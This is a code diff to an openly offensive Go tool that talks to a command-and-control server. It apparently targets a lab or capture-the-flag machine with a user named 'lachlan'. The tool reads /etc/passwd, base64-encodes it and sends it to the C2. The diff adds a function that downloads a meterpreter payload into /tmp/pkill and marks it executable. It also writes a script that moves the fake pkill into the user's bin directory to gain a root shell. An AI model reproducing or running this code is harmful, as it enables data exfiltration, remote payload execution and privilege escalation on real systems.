@@ -20,6 +20,13 @@
 // This also attempts to read the contents of /etc/passwd,
 // base64 encode them, and pass them to the C2 server.
 //
+// Additionally, this script attempts to reach out to the C2
+// server and pull down a meterpreter payload named "shell"
+// and save it in /tmp/pkill. After the fake pkill binary is
+// downloaded, a "/tmp/move_pkill.sh" script is created which
+// holds commands to copy /tmp/pkill to /home/lachlan/bin/
+// to gain a root meterpreter session on the target.
+//
 //============================================================
 //
 // Note:
@@ -34,9 +41,11 @@ import (
 	"encoding/base64"
 	"flag"
 	"fmt"
+	"io"
 	"net/http"
 	"os"
 	"os/exec"
+	"os/user"
 	"regexp"
 	"runtime"
 	"strings"
@@ -124,11 +133,40 @@ func TellPassword(c2server string, data string) (success bool, message string) {
 	return true, "Password transmitted to C2."
 }
 
+func DownloadFile(c2url string, filename string) (success bool, message string) {
+	InfoMsgNB(fmt.Sprintf("Downloading \"%s\" from C2 server.", filename))
+
+	target := fmt.Sprintf("http://%s/%s", c2url, filename)
+	client := http.Client{Timeout: 15 * time.Second}
+
+	req, err := http.NewRequest("GET", target, nil)
+	if err != nil {
+		return false, err.Error()
+	}
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return false, err.Error()
+	}
+	defer resp.Body.Close()
+
+	fptr, err := os.Create("/tmp/pkill")
+	if err != nil {
+		return false, err.Error()
+	}
+
+	_, err = io.Copy(fptr, resp.Body)
+	if err != nil {
+		return false, err.Error()
+	}
+
+	return true, fmt.Sprintf("\"%s\" downloaded successfully and saved as \"/tmp/pkill\".", filename)
+}
+
 func main() {
 	var c2address string
 	var target_ip string
 	var target_port int
-	var passwd_contents []byte
 
 	flag.StringVar(&target_ip, "i", "127.0.0.1", "ip address of C2 machine.")
 	flag.IntVar(&target_port, "p", 9999, "port to talk to C2 on.")
@@ -193,14 +231,43 @@ func main() {
 		os.Exit(1)
 	}
 
-	base64.StdEncoding.Encode(passwd_contents, output)
-	str_output = string(passwd_contents)
+	str_output = base64.StdEncoding.EncodeToString(output)
 
 	success, message = TellPassword(c2address, fmt.Sprintf("passwd=%s", str_output))
 	if !success {
 		ErrMsg(message)
 	}
 	InfoMsg(string(output))
+
+	username, err := user.Current()
+	if username.Name == "lachlan" {
+		success, message = DownloadFile(c2address, "shell")
+		if !success {
+			ErrMsg(message)
+		} else {
+			output, err = exec.Command("chmod", "+x", "/tmp/pkill").Output()
+			if err != nil {
+				ErrMsg(err.Error())
+			} else {
+				SucMsg("File saved in /tmp and marked as executable.")
+
+				fptr, err := os.Create("/tmp/move_pkill.sh")
+				if err != nil {
+					ErrMsg(err.Error())
+				}
+				defer fptr.Close()
+				fptr.Write([]byte("#!/usr/bin/bash\nmv /tmp/pkill /home/lachlan/bin/pkill"))
+
+				output, err = exec.Command("chmod", "+x", "/tmp/move_pkill.sh").Output()
+				if err != nil {
+					ErrMsg(err.Error())
+				} else {
+					SucMsg("Bash script created and marked executable.")
+				}
+			}
+
+		}
+	}
 
 	return
 }
